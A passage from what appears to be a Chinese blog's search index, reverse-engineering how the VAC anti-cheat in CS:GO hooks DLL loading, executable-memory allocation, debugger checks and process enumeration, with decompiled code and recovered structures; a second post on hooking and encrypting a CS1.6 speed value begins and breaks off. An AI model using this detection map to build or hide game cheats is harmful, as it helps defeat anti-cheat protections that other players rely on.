alt=\"image-20230104095003980\"></p>\n<p>根据Inline钩子扫描猜测当前检测功能有：</p>\n<ul>\n<li><p>禁止第三方DLL注入</p>\n<p>LdrLoadDll、LoadLibraryA、LoadLibraryExA、LoadLibraryExW、LoadLibraryW、NtOpenFile</p>\n</li>\n<li><p>申请内存、修改内存属性、写内存</p>\n<p>VirtualAlloc、VirtualProtect、VirtualAllocEx、VirtualProtectEx</p>\n</li>\n</ul>\n<p>经过火绒剑分析，发现除了<code>NtOpenFile</code>和<code>LoadLibraryExW</code>被跳转到<code>csgo.exe</code>外，其他的所有的钩子全部跳转到<code>gameoverlayrenderer.dll</code>模块中，将对应模块dump后，ida分析。</p>\n<h3 id=\"2-1-1-gameoverlayrenderer-dll分析\"><a href=\"#2-1-1-gameoverlayrenderer-dll分析\" class=\"headerlink\" title=\"2.1.1 gameoverlayrenderer.dll分析\"></a>2.1.1 gameoverlayrenderer.dll分析</h3><h4 id=\"LdrLoadDll\"><a href=\"#LdrLoadDll\" class=\"headerlink\" title=\"LdrLoadDll\"></a>LdrLoadDll</h4><p>首先会进行一个判断，猜测可能是反作弊或者是hook初始化之类的。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103181242412.png\" alt=\"image-20230103181242412\"></p>\n<p>其中会执行一个函数sub_7ADBDE50,该函数主要是收集模块信息，其中疑似有白名单检测。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103181826494.png\" alt=\"image-20230103181826494\"></p>\n<p>this[0xF126]和this[0xF124]都为byte类型，作用为开启模块收集。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span> __thiscall <span class=\"title\">RecordModuleInfos_7ADBEE50</span><span class=\"params\">(<span class=\"type\">int</span> <span class=\"keyword\">this</span>, <span class=\"type\">int</span> moduleName, DWORD arg_4)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  HANDLE CurrentThread; <span class=\"comment\">// edi</span></span><br><span class=\"line\">  DWORD CurrentThreadId; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  <span class=\"built_in\">NTSTATUS</span> (__stdcall *NtQueryInformationThread)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG); <span class=\"comment\">// eax</span></span><br><span class=\"line\">  HMODULE ModuleHandleA; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  HANDLE CurrentProcess; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v9; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  <span class=\"keyword\">volatile</span> <span class=\"type\">signed</span> __int32 *v10; <span class=\"comment\">// edx</span></span><br><span class=\"line\">  HMODULE hModule; <span class=\"comment\">// edi</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v12; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  <span class=\"keyword\">volatile</span> <span class=\"type\">signed</span> __int32 *v13; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v14; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  LPCWSTR threadEntryAddr_1; <span class=\"comment\">// ecx</span></span><br><span class=\"line\">  DWORD *v16; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  HMODULE v18; <span class=\"comment\">// [esp-Ch] [ebp-12Ch]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> curtModuleName[<span class=\"number\">264</span>]; <span class=\"comment\">// [esp+Ch] [ebp-114h] BYREF</span></span><br><span class=\"line\">  LPCWSTR v20; <span class=\"comment\">// [esp+114h] [ebp-Ch] BYREF</span></span><br><span class=\"line\">  LPCWSTR threadEntryAddr; <span class=\"comment\">// [esp+118h] [ebp-8h] BYREF</span></span><br><span class=\"line\">  HMODULE phModule; <span class=\"comment\">// [esp+11Ch] [ebp-4h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  CurrentThread = <span class=\"built_in\">GetCurrentThread</span>();</span><br><span class=\"line\">  CurrentThreadId = <span class=\"built_in\">GetCurrentThreadId</span>();</span><br><span class=\"line\">  NtQueryInformationThread = (<span class=\"built_in\">NTSTATUS</span> (__stdcall *)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG))NtQueryInformationThread_7AE57AE4;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !NtQueryInformationThread_7AE57AE4 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ModuleHandleA = <span class=\"built_in\">GetModuleHandleA</span>(<span class=\"string\">&quot;ntdll.dll&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( ModuleHandleA )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      NtQueryInformationThread = (<span class=\"built_in\">NTSTATUS</span> (__stdcall *)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG))<span class=\"built_in\">GetProcAddress</span>(ModuleHandleA, <span class=\"string\">&quot;NtQueryInformationThread&quot;</span>);</span><br><span class=\"line\">      NtQueryInformationThread_7AE57AE4 = (<span class=\"type\">int</span>)NtQueryInformationThread;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      NtQueryInformationThread = (<span class=\"built_in\">NTSTATUS</span> (__stdcall *)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG))NtQueryInformationThread_7AE57AE4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  phModule = <span class=\"number\">0</span>;</span><br><span class=\"line\">  threadEntryAddr = <span class=\"number\">0</span>;</span><br><span class=\"line\">  curtModuleName[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( NtQueryInformationThread )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v20 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">NtQueryInformationThread</span>(CurrentThread, (THREADINFOCLASS)<span class=\"number\">9</span>, &amp;threadEntryAddr, <span class=\"number\">4</span>, (PULONG)&amp;v20);<span class=\"comment\">// ThreadQuerySetWin32StartAddress</span></span><br><span class=\"line\">                                                <span class=\"comment\">// 获取当前线程的入口地址</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">GetModuleHandleExW</span>(<span class=\"number\">6u</span>, threadEntryAddr, &amp;phModule) )<span class=\"comment\">// GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS(0x4) | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT(0x2)</span></span><br><span class=\"line\">                                                <span class=\"comment\">// 通过入口地址获取所在的模块句柄</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v18 = phModule;</span><br><span class=\"line\">      CurrentProcess = <span class=\"built_in\">GetCurrentProcess</span>();</span><br><span class=\"line\">      <span class=\"built_in\">GetModuleBaseNameA</span>((<span class=\"type\">int</span>)CurrentProcess, (<span class=\"type\">int</span>)v18, (<span class=\"type\">int</span>)curtModuleName, <span class=\"number\">260</span>);<span class=\"comment\">// 通过模块句柄获取模块名</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v9 = *(_DWORD *)(<span class=\"keyword\">this</span> + <span class=\"number\">0xEAD4</span>);              <span class=\"comment\">// 获取ModuleInfos</span></span><br><span class=\"line\">  v10 = (<span class=\"keyword\">volatile</span> <span class=\"type\">signed</span> __int32 *)(<span class=\"keyword\">this</span> + <span class=\"number\">0xEAD4</span>);</span><br><span class=\"line\">  hModule = phModule;</span><br><span class=\"line\">  v20 = threadEntryAddr;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v9 &lt; <span class=\"number\">100</span> )                               <span class=\"comment\">// 结构头部为Module数量</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v12 = v9 - <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v12 &lt; <span class=\"number\">0</span> )                              <span class=\"comment\">// 如果当前Infos为空</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">insert_new_node:</span><br><span class=\"line\">      v14 = _InterlockedIncrement(v10);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v14 &lt;= <span class=\"number\">100</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        threadEntryAddr_1 = v20;</span><br><span class=\"line\">        v16 = (DWORD *)&amp;v10[<span class=\"number\">4</span> * v14];           <span class=\"comment\">// 插入一个模块信息</span></span><br><span class=\"line\">        *v16 = CurrentThreadId;</span><br><span class=\"line\">        v16[<span class=\"number\">1</span>] = (DWORD)hModule;</span><br><span class=\"line\">        v16[<span class=\"number\">2</span>] = (DWORD)threadEntryAddr_1;</span><br><span class=\"line\">        v16[<span class=\"number\">3</span>] = arg_4;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      _InterlockedIncrement((<span class=\"keyword\">volatile</span> <span class=\"type\">signed</span> __int32 *)(<span class=\"keyword\">this</span> + <span class=\"number\">60120</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v13 = &amp;v10[<span class=\"number\">4</span> * v12 + <span class=\"number\">4</span>];</span><br><span class=\"line\">      <span class=\"keyword\">while</span> ( *v13 != CurrentThreadId )         <span class=\"comment\">// 数组中的ThreadId与curtThreadId不相同</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v13 -= <span class=\"number\">4</span>;                               <span class=\"comment\">// ModuleInfon-4,实际上是回到上一个指针</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( --v12 &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">          <span class=\"keyword\">goto</span> insert_new_node;                 <span class=\"comment\">// 然后将当前模块信息重新插入infos</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>收集的模块结构如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">ModuleInfo</span>&#123;</span><br><span class=\"line\">    DWORD threadId;\t\t\t<span class=\"comment\">//模块所处的线程ID</span></span><br><span class=\"line\">    DWORD hModule;\t\t\t<span class=\"comment\">//模块句柄</span></span><br><span class=\"line\">    DWORD threadEntryAddr;\t<span class=\"comment\">//模块所在的线程入口地址</span></span><br><span class=\"line\">    DWORD unkown;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103182210961.png\" alt=\"image-20230103182210961\"></p>\n<p>除此之外，游戏还会以另一种方式收集模块信息。在调用原LdrLoadDll后会将拉起的模块句柄、函数返回值、上下文返回的上层地址进行保存在另一个数组中。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103182412330.png\" alt=\"image-20230103182412330\"></p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103182522049.png\" alt=\"image-20230103182522049\"></p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103182506075.png\" alt=\"image-20230103182506075\"></p>\n<h4 id=\"LoadLibrary系列\"><a href=\"#LoadLibrary系列\" class=\"headerlink\" title=\"LoadLibrary系列\"></a>LoadLibrary系列</h4><p>挂钩代码基本上与LdrLoadDll相同，但是LoadLibrayA中，存在对<code>d3d9.dll</code>和<code>OPENGL32</code>的判断，用来进行对应hook来实现steam面板的绘制。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103182812719.png\" alt=\"image-20230103182812719\"></p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103182821484.png\" alt=\"image-20230103182821484\"></p>\n<p>另外还会判断下图中的模块是否加载完毕，然后给全局变量赋值1，可能为反作弊的核心模块。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103182844729.png\" alt=\"image-20230103182844729\"></p>\n<h4 id=\"VirtualAlloc检测\"><a href=\"#VirtualAlloc检测\" class=\"headerlink\" title=\"VirtualAlloc检测\"></a>VirtualAlloc检测</h4><p>首先会判断申请的内存类型是否为PAGE_EXECUTE_READWRITE。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103183019935.png\" alt=\"image-20230103183019935\"></p>\n<p>然后进行记录到AllocMemInfos中。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103183052568.png\" alt=\"image-20230103183052568\"></p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103183118283.png\" alt=\"image-20230103183118283\"></p>\n<p>记录的内存块有如下结构：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">AllocMemInfo</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDWORD lpNewMem;\t\t<span class=\"comment\">//申请的内存地址</span></span><br><span class=\"line\">    DWORD dwLastError;\t<span class=\"comment\">//调用Alloc函数的错误码</span></span><br><span class=\"line\">    DWORD dwRetAddr;\t<span class=\"comment\">//调用Alloc函数的返回到地址</span></span><br><span class=\"line\">    DWORD pad_0;</span><br><span class=\"line\">    DWORD pad_1;</span><br><span class=\"line\">    DWORD lpAddress;\t<span class=\"comment\">//以下都为调用参数的记录</span></span><br><span class=\"line\">    DWORD dwSize;</span><br><span class=\"line\">    DWORD flProtect;</span><br><span class=\"line\">    DWORD flAllocationType;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"VirtualProtect检测\"><a href=\"#VirtualProtect检测\" class=\"headerlink\" title=\"VirtualProtect检测\"></a>VirtualProtect检测</h4><p>首先会判断欲修改内存类型是否为PAGE_EXECUTE_READWRITE。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103183451098.png\" alt=\"image-20230103183451098\"></p>\n<p>然后进行记录到ProtectInfos中。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103183511023.png\" alt=\"image-20230103183511023\"></p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230103183518345.png\" alt=\"image-20230103183518345\"></p>\n<p>记录的内存块有如下结构：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">ProtectInfo</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDWORD FunRet;\t\t<span class=\"comment\">//Protect函数执行的返回值</span></span><br><span class=\"line\">    DWORD dwLastError;\t<span class=\"comment\">//调用Protect函数的错误码</span></span><br><span class=\"line\">    DWORD dwRetAddr;\t<span class=\"comment\">//调用Protect函数的返回到地址</span></span><br><span class=\"line\">    DWORD pad_0;</span><br><span class=\"line\">    DWORD pad_1;</span><br><span class=\"line\">    DWORD lpAddress;\t<span class=\"comment\">//以下都为调用参数的记录</span></span><br><span class=\"line\">    DWORD dwSize;</span><br><span class=\"line\">    DWORD flProtect;</span><br><span class=\"line\">    DWORD flAllocationType;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h4><p>游戏会进行如下记录：</p>\n<p>1、记录游戏加载的模块(模块入口、模块所属的线程ID、模块句柄、加载时返回到的地址)。</p>\n<p>2、记录申请内存类型为PAGE_EXECUTE_READWRITE的内存。</p>\n<p>3、记录修改内存类型为PAGE_EXECUTE_READWRITE的内存。</p>\n<p>4、记录后作用未知，猜测在某些地方会进行扫描这些表来寻找游戏作弊。</p>\n<h2 id=\"2-1-2-csgo-exe分析\"><a href=\"#2-1-2-csgo-exe分析\" class=\"headerlink\" title=\"2.1.2 csgo.exe分析\"></a>2.1.2 csgo.exe分析</h2><h4 id=\"NtOpenFile\"><a href=\"#NtOpenFile\" class=\"headerlink\" title=\"NtOpenFile\"></a>NtOpenFile</h4><p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104112000697.png\" alt=\"image-20230104112000697\"></p>\n<p>从ObjAttr拿到文件名后判断文件名是否存在白名单，如果不存在白名单则返回错误码0xC0000034，存在则正常打开文件。</p>\n<h4 id=\"LoadLibraryExW\"><a href=\"#LoadLibraryExW\" class=\"headerlink\" title=\"LoadLibraryExW\"></a>LoadLibraryExW</h4><p>同样会首先判读是否存在白名单。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104112122129.png\" alt=\"image-20230104112122129\"></p>\n<p>存在则正常加载DLL。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104112130903.png\" alt=\"image-20230104112130903\"></p>\n<p>如果Load的DLL不在白名单内，则进行记录到表中，但记录的方式有坑。记录前会去查找一个句柄表，表中存放着一些dll的句柄、dll名、dll文件大小。游戏通过判断文件大小和文件名来查找句柄表是否存放对应的dll句柄，如果存在则返回该句柄。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104112352425.png\" alt=\"image-20230104112352425\"></p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104112252111.png\" alt=\"image-20230104112252111\"></p>\n<p>不存在则进行记录。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104112519644.png\" alt=\"image-20230104112519644\"></p>\n<h4 id=\"PeekMessage\"><a href=\"#PeekMessage\" class=\"headerlink\" title=\"PeekMessage\"></a>PeekMessage</h4><p>根据CE查看得知该函数是跳转到模块<code>GameOverlayrenderer.dll</code>中，猜测可能是与steam面板有关，故不分析。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104112648387.png\" alt=\"image-20230104112648387\"></p>\n<h4 id=\"initHook\"><a href=\"#initHook\" class=\"headerlink\" title=\"initHook\"></a>initHook</h4><p>对<code>hkNtOpenFile</code>函数继续交叉引用，可找到初始化HOOK的位置。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104113203202.png\" alt=\"image-20230104113203202\"></p>\n<p>可以看到分别对三个函数进行了HOOK，其中Hook NtOpenFile中有一个中转函数<code>sub_4E5980</code>.</p>\n<p>函数首先是判断当前的获取到的NtOpenFile函数地址是否合法。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104113954875.png\" alt=\"image-20230104113954875\"></p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104113537280.png\" alt=\"image-20230104113537280\"></p>\n<p>hookTable为一个map表，里边存放着NtOpenFile、LoadLibraryExW、PeekMessageA的原始地址，该表在较早时期进行初始化，每次HOOK都会判断GetProcAddress得到的地址与表中是否一致，防止一些IAT类型的HOOK。之后检查函数头是否存在int3、int2、nop等指令覆盖，如果没覆盖则进行Hook。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104113308336.png\" alt=\"image-20230104113308336\"></p>\n<h4 id=\"总结-1\"><a href=\"#总结-1\" class=\"headerlink\" title=\"总结\"></a>总结</h4><p>1、hook了NtOpenFile和LoadLibraryExW进行白名单判断，并且在LoadLirary中，如果dll不为白名单中则尝试查找句柄表中是否有该dll句柄，然后返回；否则就插入一个记录节点，记录该dll的信息。</p>\n<p>2、其中游戏初期会初始化一个hookTable表，里边存放着三个函数的地址；在HOOK时会重新判断地址是否一致，然后进行HOOK，防止一些IAT HOOK。</p>\n<p>3、对于记录了白名单外的dll，猜测可能是会有遍历文件，然后后台上传。</p>\n<h2 id=\"2-2-API分析\"><a href=\"#2-2-API分析\" class=\"headerlink\" title=\"2.2 API分析\"></a>2.2 API分析</h2><h3 id=\"2-2-1-tier0-dll分析\"><a href=\"#2-2-1-tier0-dll分析\" class=\"headerlink\" title=\"2.2.1 tier0.dll分析\"></a>2.2.1 tier0.dll分析</h3><h4 id=\"IsDebuggerPresent\"><a href=\"#IsDebuggerPresent\" class=\"headerlink\" title=\"IsDebuggerPresent\"></a>IsDebuggerPresent</h4><p>将CE调成VEH调试器后再<code>IsDebuggerPresent</code>函数下断.</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104123118650.png\" alt=\"image-20230104123118650\"></p>\n<p>断下后F8单步走出。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104123201020.png\" alt=\"image-20230104123201020\"></p>\n<p>发现模块返回到了<code>tier0.dll</code>。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104123258746.png\" alt=\"image-20230104123258746\"></p>\n<p>通过火绒剑查看进程模块发现有两个，由于是返回到tier0.dll中，所有这里先dump下该模块后进行分析下。</p>\n<p>对<code>IsDebuggerPresent</code>交叉引用后得到的结果基本都是判断在调试，如果调试就抛出一个<code>int3</code>。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104144627714.png\" alt=\"image-20230104144627714\"></p>\n<h4 id=\"Dr寄存器清空\"><a href=\"#Dr寄存器清空\" class=\"headerlink\" title=\"Dr寄存器清空\"></a>Dr寄存器清空</h4><p>通过导入表发现该模块还调用了<code>GetThreadContext</code>和<code>SetThreadContext</code>，疑似为清空Dr寄存器。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104144841073.png\" alt=\"image-20230104144841073\"></p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104144857872.png\" alt=\"image-20230104144857872\"></p>\n<p>但在游戏中对这两个函数下断并为断下。</p>\n<h3 id=\"2-2-2-steamclient-dll分析\"><a href=\"#2-2-2-steamclient-dll分析\" class=\"headerlink\" title=\"2.2.2 steamclient.dll分析\"></a>2.2.2 steamclient.dll分析</h3><h4 id=\"检测顶层窗口\"><a href=\"#检测顶层窗口\" class=\"headerlink\" title=\"检测顶层窗口\"></a>检测顶层窗口</h4><p>在对<code>CreateToolhelp32Snapshot</code>下断点时游戏断下，查看堆栈信息来自<code>steamclient.dll</code>。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104145405713.png\" alt=\"image-20230104145405713\"></p>\n<p>将该模块dump后，跳到返回到地址进行分析。</p>\n<p>模块首先会枚举每一个进程的PID。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104152201577.png\" alt=\"image-20230104152201577\"></p>\n<p>然后会遍历枚举到的进程ID，获取他们的文件信息保存到数组中。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104164837789.png\" alt=\"image-20230104164837789\"></p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104164934590.png\" alt=\"image-20230104164934590\"></p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104164943770.png\" alt=\"image-20230104164943770\"></p>\n<p>接着通过遍历进程，其中会寻找csgo.exe的PID。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104153441268.png\" alt=\"image-20230104153441268\"></p>\n<p>通过对遍历进程的函数进行交叉引用后，发现会获取最顶层窗口并且检查是否为csgo的窗口。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104153534264.png\" alt=\"image-20230104153534264\"></p>\n<p>并且会根据顶层窗口是否为csgo.exe来对时间数据赋值。</p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104154110565.png\" alt=\"image-20230104154110565\"></p>\n<p><img src=\"/../images/Anti/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90VAC/image-20230104154102544.png\" alt=\"image-20230104154102544\"></p>\n<p>猜测是检测是否有窗口一直覆盖再游戏上。</p>\n<h3 id=\"总结-2\"><a href=\"#总结-2\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>1、会通过IsDebuggerPresent检测是否在调试，如果调试则抛出int3异常。</p>\n<p>2、可能会清空Dr寄存器。</p>\n<p>3、会检测顶层窗口</p>\n<p>4、会枚举电脑上所有的进程，并收集进程文件的信息。</p>\n","categories":["Anti"]},{"title":"六、加密的原理及解密","url":"/2024/04/21/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/","content":"<h1 id=\"1、简单的加密解密例子\"><a href=\"#1、简单的加密解密例子\" class=\"headerlink\" title=\"1、简单的加密解密例子\"></a>1、简单的加密解密例子</h1><ul>\n<li><strong>CS1.6人物速度加密实现</strong></li>\n</ul>\n<p>首先，找到人物速度后，访问速度查看任何改写和访问的代码。</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p>然后对这四条都进行自实现简单的加解密。</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>进行HOOK。</p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>效果如下：</p>\n<p><strong>加密前</strong></p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p><strong>加密后</strong></p>\n<p><img src=\"/../images/UnrealEngine/%E5%85%AD%E3%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%AF%86/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<ul>\n<li><strong>定位解密</strong></li>\n</ul>\n<p>访问速度。</p>\n<p><img 